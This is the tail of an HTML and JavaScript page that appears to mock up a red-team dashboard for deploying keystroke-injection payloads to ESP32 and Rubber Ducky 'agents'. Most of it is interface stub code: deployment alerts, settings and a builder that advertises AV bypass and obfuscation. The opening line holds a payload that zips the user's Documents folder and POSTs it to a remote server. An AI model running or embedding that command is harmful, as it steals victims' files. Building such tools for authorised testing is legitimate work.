STRING Compress-Archive -Path C:\\Users\\%USERNAME%\\Documents -DestinationPath C:\\temp\\docs.zip; Invoke-WebRequest -Uri http://10.10.10.10/upload -Method POST -InFile C:\\temp\\docs.zip
ENTER`
            };
            
            const script = payloads[payloadType];
            if (script) {
                document.getElementById('payloadScript').value = script;
                alert(`Loaded ${payloadType} payload\\n\\nPayload has been loaded into the script editor. Review and modify as needed before deployment.`);
            }
        }
        
        function savePayload() {
            const script = document.getElementById('payloadScript').value;
            const name = prompt('Save Payload As:\\n\\nEnter payload name:');
            if (name) {
                alert(`Payload "${name}" saved successfully!\\n\\nPayload stored in:\\n Local database\\n Available for all agents\\n Can be deployed immediately`);
            }
        }
        
        function deployToAgent() {
            const script = document.getElementById('payloadScript').value;
            alert('Deploy Payload to Agent\\n\\nSelect target agent:\\n\\n ESP32-KBD-001 (Online)\\n ESP32-KBD-002 (Online)\\n DUCKY-003 (Ready)\\n ESP32-KBD-003 (Standby)\\n\\nDeployment options:\\n Execute immediately\\n Store for manual trigger\\n Schedule execution\\n\\nDeploy now?');
        }
        
        function openAdvancedBuilder() {
            alert('Advanced Payload Builder\\n\\nFeatures:\\n\\n Visual Script Builder\\n Drag-and-drop commands\\n Auto-complete suggestions\\n Syntax highlighting\\n\\n Optimization Tools\\n Timing analyzer\\n OS-specific adjustments\\n Anti-detection delays\\n\\n Evasion Techniques\\n String obfuscation\\n Command encoding\\n AV bypass methods\\n\\n Testing Suite\\n Virtual keyboard simulator\\n Payload validation\\n Success rate prediction\\n\\nLaunch advanced builder?');
        }
        
        function refreshLogs() {
            alert('Refreshing agent logs...\\n\\n Logs updated!\\n\\nNew entries:\\n 3 new connections\\n 2 payload executions\\n 1 error (ESP32-KBD-004 timeout)\\n 5 status updates');
        }
        
        // Initialize agent monitoring
        function initializeAgentMonitoring() {
            // Simulate real-time agent status updates
            setInterval(() => {
                // This would update agent statuses in real application
                console.log('Checking agent status...');
            }, 5000);
        }
        
        // Call initialization on page load
        document.addEventListener('DOMContentLoaded', initializeAgentMonitoring);
        
        // User Menu Functions
        function toggleUserMenu() {
            const dropdown = document.getElementById('userDropdown');
            dropdown.classList.toggle('show');
        }
        
        function closeUserMenu() {
            const dropdown = document.getElementById('userDropdown');
            dropdown.classList.remove('show');
        }
        
        function openUserProfile() {
            alert('User Profile\\n\\nName: John Doe\\nEmail: john.doe@company.com\\nRole: Lead Pentester\\nTeam: Red Team\\nLast Login: Nov 20, 2024 10:30 AM\\n\\nProfile settings:\\n Update personal information\\n Change avatar\\n Security preferences\\n API key management');
        }
        
        function logout() {
            if (confirm('Logout\\n\\nAre you sure you want to log out?\\n\\nAny unsaved work will be lost.')) {
                alert('Logging out...\\n\\nSaving current session...\\nClearing sensitive data...\\nRedirecting to login page...');
            }
        }
        
        // Settings Functions
        function setTheme(theme) {
            // Update theme button states
            document.querySelectorAll('.theme-option').forEach(btn => btn.classList.remove('active'));
            document.getElementById(theme + 'ThemeBtn').classList.add('active');
            
            // Apply theme (use existing toggleTheme logic but set specific theme)
            if (theme === 'light') {
                document.body.classList.remove('dark-theme');
                document.getElementById('themeIcon').textContent = '';
                document.querySelector('.theme-text').textContent = 'Light';
                localStorage.setItem('theme', 'light');
            } else if (theme === 'dark') {
                document.body.classList.add('dark-theme');
                document.getElementById('themeIcon').textContent = '';
                document.querySelector('.theme-text').textContent = 'Dark';
                localStorage.setItem('theme', 'dark');
            } else if (theme === 'auto') {
                // Auto theme based on system preference
                const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                if (prefersDark) {
                    document.body.classList.add('dark-theme');
                    document.getElementById('themeIcon').textContent = '';
                    document.querySelector('.theme-text').textContent = 'Dark';
                } else {
                    document.body.classList.remove('dark-theme');
                    document.getElementById('themeIcon').textContent = '';
                    document.querySelector('.theme-text').textContent = 'Light';
                }
                localStorage.setItem('theme', 'auto');
            }
            
            alert(`Theme set to ${theme}\\n\\nThe interface will now use the ${theme} theme${theme === 'auto' ? ' based on your system preferences' : ''}.`);
        }
        
        // Initialize theme buttons on settings page load
        function initializeThemeButtons() {
            const currentTheme = localStorage.getItem('theme') || 'light';
            document.querySelectorAll('.theme-option').forEach(btn => btn.classList.remove('active'));
            
            if (currentTheme === 'light') {
                document.getElementById('lightThemeBtn').classList.add('active');
            } else if (currentTheme === 'dark') {
                document.getElementById('darkThemeBtn').classList.add('active');
            } else if (currentTheme === 'auto') {
                document.getElementById('autoThemeBtn').classList.add('active');
            }
        }
        
        // Close dropdown when clicking outside
        document.addEventListener('click', function(event) {
            const userMenu = document.querySelector('.user-menu');
            const dropdown = document.getElementById('userDropdown');
            
            if (userMenu && dropdown && !userMenu.contains(event.target)) {
                dropdown.classList.remove('show');
            }
        });
        
        // Update page title mapping to include settings
        const originalNavigateToScreen = navigateToScreen;
        navigateToScreen = function(screenId) {
            originalNavigateToScreen(screenId);
            
            // Initialize settings page when navigating to it
            if (screenId === 'settings') {
                setTimeout(initializeThemeButtons, 100);
            }
        };
    </script>
</body>
</html>
